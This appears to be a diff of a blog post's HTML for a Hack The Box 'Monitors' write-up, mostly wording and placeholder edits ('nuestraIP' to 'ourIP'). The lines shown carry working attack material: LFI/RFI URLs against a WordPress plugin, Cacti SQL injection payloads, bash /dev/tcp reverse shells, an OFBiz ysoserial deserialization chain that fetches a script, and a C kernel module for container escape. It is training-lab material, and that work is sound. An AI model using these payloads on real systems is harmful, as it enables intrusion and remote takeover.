@@ -240,7 +240,7 @@
 
 <p>The most relevant findings from this new scan are that the server is using <code class="language-plaintext highlighter-rouge">WordPress 5.5.1</code>, which allows us to identify the content management system in use, and confirms that the server is running on <code class="language-plaintext highlighter-rouge">Ubuntu</code>.</p>
 
-<p>After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses <code class="language-plaintext highlighter-rouge">WordPress</code>, we can search for common paths such as admin panels, content directories, and other typical CMS routes.</p>
+<p>After spending some time exploring the page, we did not find anything of particular interest. However, knowing that the site uses <code class="language-plaintext highlighter-rouge">WordPress</code>, we can search for common paths such as admin panels, content directories, and other typical <em>CMS</em> routes.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/9.png" alt="9" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -251,11 +251,11 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/10.png" alt="10" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Among the paths found, we discovered the <code class="language-plaintext highlighter-rouge">wp-admin</code> admin panel; however, attempting to access it with default known credentials will not be effective in this case.</p>
+<p>Among the paths found, we discovered the <code class="language-plaintext highlighter-rouge">wp-admin</code> panel; however, attempting to access it with default known credentials will not be effective in this case.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>We also discovered that the <code class="language-plaintext highlighter-rouge">wp-content</code> directory is accessible, which represents a configuration error, as this directory contains CMS resources that should be protected. Within this directory, we can perform a second <em>fuzzing</em> (or alternatively, we could manually search for specific paths), which leads us to the <code class="language-plaintext highlighter-rouge">plugins</code> directory.</p>
+<p>We also discovered that the <code class="language-plaintext highlighter-rouge">wp-content</code> directory is accessible, which represents a configuration error, as this directory contains <em>CMS</em> resources that should be protected. Within this directory, we can perform a second <em>fuzzing</em> (or alternatively, we could manually search for specific paths), which leads us to the <code class="language-plaintext highlighter-rouge">plugins</code> directory.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
 </code></pre></div></div>
@@ -272,7 +272,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/15.png" alt="15" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>, or by searching online in the <em>Exploit Database</em>.</p>
+<p>With this information, we can proceed to investigate whether this version has any known vulnerabilities that we can exploit. We can do this directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>, or by searching online on <em>Exploit Database</em>.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit spritz
 </code></pre></div></div>
@@ -283,19 +283,19 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/17.png" alt="17" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>To test this, we can create any text file and, using <em>Python</em>, we can host an HTTP server from the same file path to make it accessible via:</p>
+<p>To test this, we can create any text file and, using <em>Python</em>, we can host an <em>HTTP</em> server from the same file path to make it accessible via:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 80
 </code></pre></div></div>
 
 <p>Now, if we point to the URL below, we will see that we can read the contents we wrote in our text file.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&lt;nuestraIP&gt;:80/&lt;nombreArchivo&gt;
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=http://&lt;ourIP&gt;:80/&lt;nombreArchivo&gt;
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/18.png" alt="18" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>However, if we try to load a <em>reverse shell</em>, it will not execute because the <code class="language-plaintext highlighter-rouge">RFI</code> uses the <code class="language-plaintext highlighter-rouge">file_get_contents</code> function, which simply reads the file content as text, without interpreting or executing any PHP code it contains.</p>
+<p>However, if we try to load a <em>reverse shell</em>, it will not execute because the <code class="language-plaintext highlighter-rouge">RFI</code> uses the <code class="language-plaintext highlighter-rouge">file_get_contents</code> function, which simply reads the file content as text, without interpreting or executing any <em>PHP</em> code it contains.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/19.png" alt="19" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -327,7 +327,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/24.png" alt="24" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Whether because we suspect there might be additional configurations or because we’ve carefully examined <code class="language-plaintext highlighter-rouge">Apache's</code> configuration files, we find clues about the possible existence of additional domains. For instance, in the <code class="language-plaintext highlighter-rouge">ports.conf</code> file, it mentions that any port changes or additions may require adjustments to the <em>VirtualHost</em> declaration in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>. This reminds us that the server has been applying <code class="language-plaintext highlighter-rouge">virtual hosting</code> from the start, which could indicate the presence of domains we are not aware of yet.</p>
+<p>Whether because we suspect there might be additional configurations or because we’ve carefully examined <code class="language-plaintext highlighter-rouge">Apache's</code> configuration files, we find clues about the possible existence of additional domains. For instance, in the <code class="language-plaintext highlighter-rouge">ports.conf</code> file, it mentions that any port changes or additions may require adjustments to the <em>VirtualHost</em> statement in <code class="language-plaintext highlighter-rouge">/etc/apache2/sites-enabled/000-default.conf</code>. This reminds us that the server has been applying <code class="language-plaintext highlighter-rouge">virtual hosting</code> from the start, which could indicate the presence of domains we are not aware of yet.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../../../../etc/apache2/ports.conf
 </code></pre></div></div>
@@ -367,7 +367,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/31.png" alt="31" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>To check, we can search online in the <em>Exploit Database</em> or directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+<p>To check, we can search online on <em>Exploit Database</em> or directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit cacti 1.2.12
 </code></pre></div></div>
@@ -401,7 +401,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/36.png" alt="36" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Now we are interested in listing all the tables in the database; for this, we will use the following payload:</p>
+<p>Now we are interested in listing all the tables in the database; for this, we will use the following <em>payload</em>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UNION+SELECT+NULL,table_name,NULL,NULL,NULL,NULL,NULL+FROM+information_schema.tables;--+-
 </code></pre></div></div>
@@ -426,7 +426,7 @@
 
 <p>However, there is a second injection that allows us to obtain a <em>reverse shell</em> inside the machine. This injection is performed as follows:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UPDATE+settings+SET+value='bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1;'+WHERE+name='path_php_binary';--+-
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;filter=1')+UPDATE+settings+SET+value='bash -i &gt;&amp; /dev/tcp/&lt;ourIP&gt;/443 0&gt;&amp;1;'+WHERE+name='path_php_binary';--+-
 </code></pre></div></div>
 
 <p>By modifying the <code class="language-plaintext highlighter-rouge">path_php_binary</code> parameter in the <em>settings</em> table to point to a <em>reverse shell</em> instead of the PHP executable, we manage to execute our command. This happens because <code class="language-plaintext highlighter-rouge">Cacti</code> uses the value of this parameter in the <code class="language-plaintext highlighter-rouge">host_reindex()</code> function, located in the file <a href="https://github.com/Cacti/cacti/blob/develop/host.php">host.php</a>. The logic behind this is as follows:</p>
@@ -474,9 +474,7 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://cacti-admin.monitors.htb/cacti/host.php?action=reindex
 </code></pre></div></div>
 
-<p>By doing so, we manage to establish the reverse shell, gaining direct access to the machine.</p>
-
-<p>Once inside the machine, we can confirm our presence in the system using the following command:</p>
+<p>By doing so, we manage to establish the reverse shell, gaining direct access to the machine. Once inside the machine, we can confirm our presence in the system using the following command:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hostname -I
 </code></pre></div></div>
@@ -490,9 +488,9 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls -l /var/run/docker.sock
 </code></pre></div></div>
 
-<p>This shows that the socket is owned by the user <em>root</em> and the group <em>docker</em>, indicating that access to the Docker daemon is restricted to these users and members of the <em>docker</em> group. This means that our current user doesn’t have permission to interact with Docker directly, so commands like <code class="language-plaintext highlighter-rouge">docker ps</code> or <code class="language-plaintext highlighter-rouge">docker info</code> won’t be effective.</p>
+<p>This shows that the socket is owned by the user <em>root</em> and the group <em>docker</em>, indicating that access to the <em>Docker daemon</em> is restricted to these users and members of the <em>docker</em> group. This means that our current user doesn’t have permission to interact with <code class="language-plaintext highlighter-rouge">Docker</code> directly, so commands like <code class="language-plaintext highlighter-rouge">docker ps</code> or <code class="language-plaintext highlighter-rouge">docker info</code> won’t be effective.</p>
 
-<p>Another way to confirm if Docker is running is to inspect active processes with:</p>
+<p>Another way to confirm if <code class="language-plaintext highlighter-rouge">Docker</code> is running is to inspect active processes with:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps aux | grep dockerd
 </code></pre></div></div>
@@ -574,7 +572,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png" alt="53" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>As we have been doing, we will investigate whether this version of <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> has any known vulnerabilities that we can exploit. We can do this by searching online, in <em>Exploit Database</em>, or directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
+<p>As we have been doing, we will investigate whether this version of <code class="language-plaintext highlighter-rouge">Apache OFBiz</code> has any known vulnerabilities that we can exploit. We can do this by searching online, on <em>Exploit Database</em>, or directly from the console using <code class="language-plaintext highlighter-rouge">searchsploit</code>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>searchsploit ofbiz 17.12.01
 </code></pre></div></div>
@@ -590,14 +588,14 @@
 <p>Next, we will write a <em>reverse shell</em> in <em>Bash</em>. This <em>reverse shell</em> will allow us to gain remote access from the server to our machine. To do this, we will create a file called <code class="language-plaintext highlighter-rouge">shell.sh</code> with the following content:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
-/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;nuestraIP&gt;/443 0&gt;&amp;1
+/bin/bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;ourIP&gt;/443 0&gt;&amp;1
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png" alt="56" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>Next, we will generate the <em>payload</em> in <em>JAR</em> format, using the <code class="language-plaintext highlighter-rouge">CommonsBeanutils1</code> class. This class is part of <em>Apache Commons</em> and has been exploited in the past to execute arbitrary code in serialized objects. By using <code class="language-plaintext highlighter-rouge">ysoserial</code> together with <code class="language-plaintext highlighter-rouge">CommonsBeanutils1</code>, we can embed commands into a serialized object that the server will execute when it <em>deserializes</em> it. In this case, the <em>payload</em> is designed so that the server will download our <code class="language-plaintext highlighter-rouge">shell.sh</code> file into the victim machine’s temporary directory (<code class="language-plaintext highlighter-rouge">/tmp</code>). We will encode the output of the <em>payload</em> in <code class="language-plaintext highlighter-rouge">base64</code> to facilitate transmission and avoid issues during the process:</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-all.jar CommonsBeanutils1 "wget &lt;nuestraIP&gt;/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java -jar ysoserial-all.jar CommonsBeanutils1 "wget &lt;ourIP&gt;/shell.sh -O /tmp/shell.sh" | base64 | tr -d "\n"; echo
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png" alt="57" class="blog-image" onclick="expandImage(this)" /></p>
@@ -612,7 +610,7 @@
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt; PAYLOAD &lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
 </code></pre></div></div>
 
-<p>Here, <code class="language-plaintext highlighter-rouge">PAYLOAD</code> is the <em>base64</em> content that we generated in the previous step.</p>
+<p>Here, <code class="language-plaintext highlighter-rouge">PAYLOAD</code> is the <code class="language-plaintext highlighter-rouge">base64</code> content that we generated in the previous step.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png" alt="58" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -623,7 +621,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png" alt="59" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Before sending this second <em>payload</em>, we will set our machine to listen using <code class="language-plaintext highlighter-rouge">Netcat</code> to receive the reverse shell:</p>
+<p>Before sending this second <em>payload</em>, we will set our machine to listen using <code class="language-plaintext highlighter-rouge">Netcat</code> to receive the <em>reverse shell</em>:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
 </code></pre></div></div>
@@ -653,7 +651,7 @@
 
 <p>Among the <em>capabilities</em> found in the container, we identified <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code> and <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>, both of which we could attempt to exploit. With <code class="language-plaintext highlighter-rouge">CAP_DAC_OVERRIDE</code>, we could write to the host machine’s filesystem. However, for this to be possible, the <code class="language-plaintext highlighter-rouge">CAP_DAC_READ_SEARCH</code> capability must also be present, which is not the case here, so this exploitation path is not viable. Instead, we can exploit <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code>.</p>
 
-<p>This <em>capability</em> allows processes to load and unload <em>kernel modules</em>, enabling us to inject code directly into the system’s <em>kernel</em>. Since containers are isolated at the operating system (OS) level but share the <em>kernel</em> with the host system, this <em>capability</em> allows us to interact with it through the container. This enables us to fully compromise the system by modifying the <em>kernel</em> and bypassing all Linux security barriers, including security modules and the container’s isolation itself.</p>
+<p>This <em>capability</em> allows processes to load and unload <em>kernel modules</em>, enabling us to inject code directly into the system’s <em>kernel</em>. Since containers are isolated at the operating system (OS) level but share the <em>kernel</em> with the host system, this <em>capability</em> allows us to interact with <em>it</em> through the container. This enables us to fully compromise the system by modifying the <em>kernel</em> and bypassing all Linux security barriers, including security modules and the container’s isolation itself.</p>
 
 <p>To take advantage of the <code class="language-plaintext highlighter-rouge">CAP_SYS_MODULE</code> capability and escape the container, we will write a <em>kernel module</em> that opens a <em>reverse shell</em> to our attacker machine. This module will be compiled using a <em>Makefile</em>, and then injected into the host system’s <em>kernel</em> to execute the code.</p>
 
@@ -662,7 +660,7 @@
 <div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
 #include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
 </span>
-<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/&lt;nuestraIP&gt;/4444 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/&lt;ourIP&gt;/4444 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
 <span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
 
 <span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">reverse_shell_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
@@ -703,10 +701,10 @@
 
 <p>From the container, we will download the two files we just created using <code class="language-plaintext highlighter-rouge">wget</code>.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;nuestraIP&gt;:80/reverse-shell.c
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;ourIP&gt;:80/reverse-shell.c
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;nuestraIP&gt;:80/Makefile
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget http://&lt;ourIP&gt;:80/Makefile
 </code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/64.png" alt="64" class="blog-image" onclick="expandImage(this)" /></p>
